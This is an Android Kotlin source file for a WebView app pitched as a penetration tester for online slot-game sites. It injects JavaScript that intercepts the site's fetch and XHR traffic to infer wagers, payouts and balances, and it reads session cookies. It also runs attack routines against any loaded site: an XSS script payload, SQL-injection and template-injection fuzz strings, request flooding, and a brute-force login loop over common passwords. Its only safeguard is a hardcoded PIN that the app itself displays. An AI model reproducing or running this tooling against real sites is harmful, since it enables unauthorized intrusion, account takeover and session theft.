
package com.yourcompany.fortunateslotpenetration

import android.annotation.SuppressLint
import android.net.Uri
import android.os.Bundle
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import com.google.gson.Gson
import java.io.OutputStream
import java.time.Instant
import java.util.concurrent.CopyOnWriteArrayList

data class LogEntry(
  val time: String,
  val type: String,
  val message: String,
  val details: Map<String, Any?> = emptyMap()
)

class MainActivity : AppCompatActivity() {

  private val gson = Gson()
  private val AUTH_PIN = "1187"
  private var destructiveArmed = false

  private lateinit var web: WebView
  private lateinit var rtpValue: TextView
  private lateinit var balanceValue: TextView
  private lateinit var logView: TextView
  private lateinit var edPin: EditText
  private lateinit var edUrl: EditText
  private lateinit var btnGo: Button
  private lateinit var btnTogglePanel: Button
  private lateinit var btnRun: Button
  private lateinit var btnExport: Button
  private lateinit var spinner: Spinner
  private lateinit var panel: LinearLayout

  private var totalWager = 0.0
  private var totalPayout = 0.0

  private var detectedWagerKey: String? = null
  private var detectedPayoutKey: String? = null
  private var detectedBalanceKey: String? = null

  private val logs = CopyOnWriteArrayList<LogEntry>()

  @SuppressLint("SetJavaScriptEnabled")
  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)

    web = findViewById(R.id.web)
    rtpValue = findViewById(R.id.rtpValue)
    balanceValue = findViewById(R.id.balanceValue)
    logView = findViewById(R.id.logView)
    edPin = findViewById(R.id.edPin)
    edUrl = findViewById(R.id.edUrl)
    btnGo = findViewById(R.id.btnGo)
    btnTogglePanel = findViewById(R.id.btnTogglePanel)
    btnRun = findViewById(R.id.btnRun)
    btnExport = findViewById(R.id.btnExport)
    spinner = findViewById(R.id.testSpinner)
    panel = findViewById(R.id.panel)

    val tests = listOf(
      "Game-Aware Analytics (Passive)",
      "Session/Cookie Check (Passive)",
      "Header Check (Passive)",
      "XSS Injection (Destructive)",
      "CSRF Probe (Destructive)",
      "Param Fuzz (Destructive)",
      "Rate Limit (Destructive)",
      "Brute Force (Destructive)"
    )
    spinner.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, tests)

    with(web.settings) {
      javaScriptEnabled = true
      domStorageEnabled = true
      mixedContentMode = WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
    }
    web.webViewClient = object : WebViewClient() {
      override fun onPageFinished(view: WebView?, url: String?) {
        injectHook()
      }
    }

    web.addJavascriptInterface(object {
      @JavascriptInterface
      fun onEvent(json: String) {
        runOnUiThread {
          val map: Map<String, Any?> = try {
            gson.fromJson(json, Map::class.java) as Map<String, Any?>
          } catch (e: Exception) {
            mapOf("raw" to json)
          }
          appendLog("GAME_DATA", "Captured payload", map)
          autoDetectKeys(map)
          updateRtpAndBalance(map)
        }
      }
    }, "PentestBridge")

    btnGo.setOnClickListener {
      val url = edUrl.text.toString().ifBlank { "https://duckduckgo.com" }
      web.loadUrl(url)
    }
    btnTogglePanel.setOnClickListener {
      panel.visibility = if (panel.visibility == android.view.View.VISIBLE)
        android.view.View.GONE else android.view.View.VISIBLE
    }
    btnRun.setOnClickListener { runSelectedTest() }
    btnExport.setOnClickListener { exportLogs() }

    edUrl.setText("https://duckduckgo.com")
    btnGo.performClick()
  }

  private fun appendLog(type: String, message: String, details: Map<String, Any?> = emptyMap()) {
    val entry = LogEntry(Instant.now().toString(), type, message, details)
    logs += entry
    val line = "${entry.time} [${entry.type}] ${entry.message} " +
      (if (details.isNotEmpty()) "\n" + gson.toJson(details) else "") + "\n\n"
    logView.text = line + logView.text
  }

  private fun requirePin(): Boolean {
    val ok = edPin.text.toString() == AUTH_PIN
    if (!ok) Toast.makeText(this, "PIN required (1187).", Toast.LENGTH_LONG).show()
    return ok
  }

  private fun requireDestructive(): Boolean {
    if (!requirePin()) return false
    destructiveArmed = true
    return true
  }

  private fun injectHook() {
    val js = """
      (function(){
        if (window.__pentestHooked) return;
        const _fetch = window.fetch;
        window.fetch = async function(...args){
          const res = await _fetch.apply(this, args);
          try {
            const clone = res.clone();
            const ct = clone.headers.get('content-type')||'';
            if (ct.includes('json')) {
              clone.text().then(t=>{
                try {
                  const data = JSON.parse(t);
                  window.PentestBridge && PentestBridge.onEvent(JSON.stringify(data));
                } catch(e){}
              });
            }
          } catch(e){}
          return res;
        };
        const _open = XMLHttpRequest.prototype.open;
        const _send = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.open = function(m,u,a,us,p){ this.__url = u; return _open.apply(this, arguments); };
        XMLHttpRequest.prototype.send = function(body){
          this.addEventListener('load', function(){
            try {
              const ct = this.getResponseHeader('content-type')||'';
              if (ct.includes('json')) {
                PentestBridge.onEvent(this.responseText);
              }
            } catch(e){}
          });
          return _send.apply(this, arguments);
        };
        window.__pentestHooked = true;
      })();
    """.trimIndent()
    web.evaluateJavascript(js, null)
    appendLog("Inject", "Hook installed")
  }

  private fun autoDetectKeys(data: Map<String, Any?>) {
    val numeric = mutableMapOf<String, Double>()
    fun collect(m: Map<String, Any?>, prefix: String = "") {
      for ((k, v) in m) {
        val key = if (prefix.isEmpty()) k else "$prefix.$k"
        when (v) {
          is Number -> numeric[key] = v.toDouble()
          is Map<*, *> -> try { collect(v as Map<String, Any?>, key) } catch (_: Exception) {}
        }
      }
    }
    collect(data)

    if (detectedWagerKey == null) {
      numeric.entries.sortedBy { it.value }.firstOrNull { it.value > 0 && it.value <= 10.0 }?.let {
        detectedWagerKey = it.key
      }
    }
    if (detectedPayoutKey == null) {
      val w = detectedWagerKey?.let { numeric[it] }
      if (w != null) {
        numeric.entries.firstOrNull { it.key != detectedWagerKey && (it.value == 0.0 || it.value >= w) }?.let {
          detectedPayoutKey = it.key
        }
      } else {
        numeric.entries.firstOrNull { it.value == 0.0 }?.let { detectedPayoutKey = it.key }
      }
    }
    if (detectedBalanceKey == null) {
      numeric.entries.firstOrNull { it.key.lowercase().contains("bal") }?.let { detectedBalanceKey = it.key }
    }

    if (detectedWagerKey != null && detectedPayoutKey != null) {
      appendLog("Detect", "Auto-detected keys", mapOf(
        "wagerKey" to detectedWagerKey, "payoutKey" to detectedPayoutKey, "balanceKey" to detectedBalanceKey
      ))
    }
  }

  private fun updateRtpAndBalance(map: Map<String, Any?>) {
    fun readDouble(key: String?): Double? {
      if (key == null) return null
      val parts = key.split(".")
      var cur: Any? = map
      for (p in parts) {
        cur = if (cur is Map<*, *>) cur[p] else null
      }
      return (cur as? Number)?.toDouble()
    }

    val wager = readDouble(detectedWagerKey)
    val payout = readDouble(detectedPayoutKey)
    val balance = readDouble(detectedBalanceKey)

    if (wager != null && payout != null) {
      totalWager += wager
      totalPayout += payout
      val rtp = if (totalWager > 0) (totalPayout / totalWager) * 100.0 else 0.0
      rtpValue.text = String.format("%.2f%%", rtp)
    }
    if (balance != null) {
      balanceValue.text = String.format("%.2f", balance)
    }
  }

  private fun runSelectedTest() {
    val sel = spinner.selectedItem as String
    when (sel) {
      "Game-Aware Analytics (Passive)" -> {
        if (requirePin()) { appendLog("Analytics","Passive analytics enabled") ; injectHook() }
      }
      "Session/Cookie Check (Passive)" -> {
        if (requirePin()) runCookieCheck()
      }
      "Header Check (Passive)" -> {
        if (requirePin()) headerCheck()
      }
      "XSS Injection (Destructive)" -> {
        if (requireDestructive()) destructivePost("/test/xss", mapOf("input" to "<script>alert('xss')</script>"))
      }
      "CSRF Probe (Destructive)" -> {
        if (requireDestructive()) destructivePost("/", emptyMap(), includeCreds = true)
      }
      "Param Fuzz (Destructive)" -> {
        if (requireDestructive()) {
          val payloads = listOf("' OR 1=1 --", "<img src=x onerror=alert(1)>", "${'$'}{7*7}")
          var delay = 0L
          payloads.forEach { p ->
            web.postDelayed({ destructiveGet("/search?q=" + Uri.encode(p)) }, delay)
            delay += 300L
          }
        }
      }
      "Rate Limit (Destructive)" -> {
        if (requireDestructive()) {
          repeat(10) { i -> web.postDelayed({ destructiveGet("/") }, (i * 200L)) }
        }
      }
      "Brute Force (Destructive)" -> {
        if (requireDestructive()) {
          val users = listOf("admin","test","player")
          val pwds = listOf("1234","password","letmein")
          var d = 0L
          for (u in users) for (p in pwds) {
            web.postDelayed({ destructivePost("/login", mapOf("username" to u, "password" to p)) }, d)
            d += 350L
          }
        }
      }
    }
  }

  private fun runCookieCheck() {
    web.evaluateJavascript(
      "(function(){ try { return document.cookie || ''; } catch(e){ return 'cookie_err:'+e; } })();"
    ) { cookieStr ->
      appendLog("Cookies", "document.cookie snapshot", mapOf("cookies" to cookieStr))
    }
  }

  private fun headerCheck() {
    web.evaluateJavascript(
      """
      (async () => {
        try {
          const res = await fetch(location.href, { method: 'HEAD' });
          return JSON.stringify({ status: res.status, ok: res.ok });
        } catch(e) { return JSON.stringify({ error: ''+e }); }
      })();
      """.trimIndent()
    ) { json ->
      appendLog("Header", "HEAD check", mapOf("result" to json))
    }
  }

  private fun destructiveGet(path: String) {
    if (!destructiveArmed) { appendLog("DENIED","Destructive not armed"); return }
    val js = """
      (async () => {
        try {
          const res = await fetch(new URL("$path", location.href).toString(), { credentials: 'include' });
          return JSON.stringify({kind:'GET', path:"$path", status: res.status});
        } catch(e) {
          return JSON.stringify({kind:'GET_ERR', path:"$path", error: ''+e});
        }
      })();
    """.trimIndent()
    web.evaluateJavascript(js) { result ->
      appendLog("DestructiveGET", "Executed", mapOf("result" to result))
    }
  }

  private fun destructivePost(path: String, body: Map<String,Any?>, includeCreds: Boolean = true) {
    if (!destructiveArmed) { appendLog("DENIED","Destructive not armed"); return }
    val json = gson.toJson(body).replace("\"","\\\"")
    val creds = if (includeCreds) "include" else "omit"
    val js = """
      (async () => {
        try {
          const res = await fetch(new URL("$path", location.href).toString(), {
            method: 'POST',
            credentials: '$creds',
            headers: { 'Content-Type':'application/json' },
            body: "$json"
          });
          let info = { kind:'POST', path:"$path", status: res.status };
          try { info.body = await res.clone().text(); } catch(e){}
          return JSON.stringify(info);
        } catch(e) {
          return JSON.stringify({kind:'POST_ERR', path:"$path", error: ''+e});
        }
      })();
    """.trimIndent()
    web.evaluateJavascript(js) { result ->
      appendLog("DestructivePOST", "Executed", mapOf("result" to result))
    }
  }

  private fun exportLogs() {
    // On Android without Activity Result API boilerplate, we can just print logs
    appendLog("Export", "Logs JSON", mapOf("logs" to logs.map { it.copy() }))
  }
}
